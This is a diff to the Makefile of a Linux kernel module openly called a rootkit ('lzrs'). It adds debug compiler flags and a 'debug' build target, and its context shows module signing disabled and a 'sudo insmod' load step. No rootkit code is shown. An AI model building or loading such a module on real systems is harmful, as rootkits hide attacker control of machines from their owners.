@@ -1,4 +1,5 @@
 CONFIG_MODULE_SIG=n
+MY_CFLAGS += -g -DDEBUG
 
 # module name
 ROOTKIT		:= lzrs
@@ -34,6 +35,9 @@ ccflags-y 	:= -I$(SRC_H) -I$(INCL_H) -g -DDEBUG
 # compilation
 all:
 	$(MAKE) -C $(BUILD_DIR) M=$(PWD) modules
+
+debug:
+	$(MAKE) -C $(BUILD_DIR) M=$(PWD) modules EXTRA_CFLAGS="$(MY_CFLAGS)"
 
 load:
 	sudo insmod $(ROOTKIT).ko
